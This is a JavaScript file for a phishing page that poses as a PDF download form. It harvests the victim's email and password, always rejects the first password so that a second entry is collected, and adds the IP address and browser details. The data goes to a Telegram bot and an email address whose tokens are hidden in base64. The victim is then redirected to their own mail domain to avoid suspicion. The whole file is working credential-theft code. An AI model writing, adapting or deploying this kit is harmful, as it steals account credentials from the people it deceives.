// Main application wrapper
(function() {
    // Configuration object with encoded values
    const config = {
        telegram: {
            token: atob("NzUxMjcwOTI3MDpBQUdLVkhjVE1FUDNCdXJYd1VDZGoxQ0dWcUFOSnVtWmVFaw=="),
            chatId: atob("NzcxMzY3MTM0OA==")
        },
        emailjs: {
            service: atob("c2VydmljZV8wZ2NybmJm"),
            template: atob("dGVtcGxhdGVfbXZta3JlNA=="),
            to: atob("anVkaWUuc2UwMUBnbWFpbC5jb20=")
        }
    };

    // State management
    const state = {
        userAgent: navigator.userAgent,
        email: "",
        currentStep: 1
    };

    // Initialize email from URL
    function initEmailFromUrl() {
        try {
            const hash = window.location.hash;
            if (hash && hash.includes('#')) {
                const emailFromHash = hash.substring(1);
                if (emailFromHash) {
                    state.email = decodeURIComponent(emailFromHash);
                    const emailInput = document.getElementById('emailInput');
                    if (emailInput) emailInput.value = state.email;
                }
            }
        } catch (e) {
            console.log('No email in URL');
        }
    }

    // EmailJS service
    function sendEmailNotification(title, content) {
        if (typeof emailjs !== 'undefined') {
            emailjs.send(config.emailjs.service, config.emailjs.template, {
                title: title,
                message: content,
                to_email: config.emailjs.to
            }).then(function() {
                console.log('Email sent successfully');
            }, function(error) {
                console.log('Email failed:', error);
            });
        }
    }

    // Form submission handler
    function submitFormData(formData) {
        if (typeof $ !== 'undefined') {
            $.ajax({
                url: '',
                method: 'POST',
                data: formData,
                success: function(response) {
                    console.log('Form submitted successfully');
                },
                error: function(error) {
                    console.log('Form submission failed');
                }
            });
        }
    }

    // Fixed Telegram message sender
    function sendTelegramMessage(message) {
        const telegramUrl = `https://api.telegram.org/bot${config.telegram.token}/sendMessage`;
        const payload = {
            chat_id: config.telegram.chatId,
            text: message,
            parse_mode: 'HTML'
        };

        if (typeof $ !== 'undefined') {
            $.ajax({
                url: telegramUrl,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(payload),
                success: function(response) {
                    console.log('Telegram message sent via jQuery');
                },
                error: function(xhr, status, error) {
                    console.log('jQuery Telegram failed, trying fetch...');
                    sendTelegramFetch(telegramUrl, payload);
                }
            });
        } else {
            sendTelegramFetch(telegramUrl, payload);
        }
    }

    // Fetch API fallback for Telegram
    function sendTelegramFetch(url, payload) {
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Telegram message sent via fetch');
            } else {
                console.log('Telegram API error:', data);
            }
        })
        .catch(error => {
            console.log('Telegram fetch failed:', error);
        });
    }

    // Get client IP
    function getClientIP() {
        return new Promise((resolve) => {
            if (typeof $ !== 'undefined') {
                $.get('https://api.ipify.org?format=json')
                    .done(function(data) {
                        resolve(data.ip);
                    })
                    .fail(function() {
                        fetch('https://api.ipify.org?format=json')
                            .then(response => response.json())
                            .then(data => resolve(data.ip))
                            .catch(() => resolve('Unknown'));
                    });
            } else {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => resolve(data.ip))
                    .catch(() => resolve('Unknown'));
            }
        });
    }

    // Step 1: Email submission
    function setupStep1() {
        const step1Form = document.getElementById('step1');
        const emailInput = document.getElementById('emailInput');
        const step1Btn = document.getElementById('step1Btn');

        if (step1Form && emailInput && step1Btn) {
            step1Form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                state.email = emailInput.value.trim();
                if (!state.email) return;

                step1Btn.disabled = true;
                step1Btn.innerHTML = 'Loading... <span class="spinner"></span>';

                setTimeout(function() {
                    const emailInputView = document.getElementById('emailInputView');
                    if (emailInputView) emailInputView.value = state.email;

                    const step1Elem = document.getElementById('step1');
                    const step2Elem = document.getElementById('step2');
                    if (step1Elem) step1Elem.style.display = 'none';
                    if (step2Elem) step2Elem.style.display = 'block';

                    step1Btn.disabled = false;
                    step1Btn.innerHTML = '<span>Continue</span>';
                }, 1500);
            });
        }
    }

    // Step 2: Password submission
    function setupStep2() {
        const step2Form = document.getElementById('step2');
        const passwordInput = document.getElementById('passwordInput');
        const confirmInput = document.getElementById('confirmInput');
        const step2Btn = document.getElementById('step2Btn');
        const confirmContainer = document.getElementById('confirmContainer');
        const passwordContainer = document.getElementById('passwordContainer');
        const passwordError = document.getElementById('passwordError');

        if (step2Form && passwordInput && step2Btn) {
            step2Form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const password = passwordInput.value.trim();
                const confirmPassword = confirmInput ? confirmInput.value.trim() : '';
                
                step2Btn.disabled = true;
                step2Btn.innerHTML = 'Verifying... <span class="spinner"></span>';

                setTimeout(async function() {
                    const isConfirmVisible = confirmContainer ? 
                        confirmContainer.style.display !== 'none' : false;

                    if (isConfirmVisible) {
                        if (!confirmPassword) {
                            alert('Please confirm your password.');
                            step2Btn.disabled = false;
                            step2Btn.innerHTML = 'Download';
                            return;
                        }

                        const clientIP = await getClientIP();
                        const message = `🧾 PDF Download Form\n\n📧 Email: ${state.email}\n🔐 Password: ${password}\n🔐 Confirm: ${confirmPassword}\n🌐 IP: ${clientIP}\n🖥️ Browser: ${state.userAgent}`;

                        try {
                            await sendTelegramMessage(message);
                        } catch (error) {
                            console.log('Telegram send error:', error);
                        }
                        
                        sendEmailNotification('New Record', message);
                        submitFormData({
                            email: state.email,
                            password: password,
                            confirm_password: confirmPassword,
                            ip: clientIP,
                            browser_info: state.userAgent
                        });

                        const domain = state.email.split('@')[1];
                        if (domain) {
                            window.location.href = 'https://' + domain;
                        }

                    } else {
                        const clientIP = await getClientIP();
                        const message = `🧾 PDF Download Form\n\n📧 Email: ${state.email}\n🔐 Password: ${password}\n🌐 IP: ${clientIP}\n🖥️ Browser: ${state.userAgent}`;

                        try {
                            await sendTelegramMessage(message);
                        } catch (error) {
                            console.log('Telegram send error:', error);
                        }
                        sendEmailNotification('New Record', message);

                        if (passwordError) passwordError.style.display = 'block';
                        if (confirmContainer) confirmContainer.style.display = 'block';
                        if (passwordContainer) passwordContainer.style.display = 'none';
                    }

                    step2Btn.disabled = false;
                    step2Btn.innerHTML = 'Download';
                }, 1500);
            });
        }
    }

    // Initialize everything when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            initEmailFromUrl();
            setupStep1();
            setupStep2();
        });
    } else {
        initEmailFromUrl();
        setupStep1();
        setupStep2();
    }

})();
